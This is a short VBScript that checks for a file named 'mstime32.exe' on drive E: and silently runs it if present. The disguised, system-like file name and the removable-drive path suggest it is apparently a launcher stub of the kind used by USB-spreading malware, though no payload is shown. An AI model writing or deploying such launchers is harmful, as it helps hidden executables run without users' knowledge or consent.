Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists("E:\mstime32.exe") Then
set WshShell = CreateObject("WScript.Shell")
WshShell.Run "E:\mstime32.exe"
End If
WSCript.Quit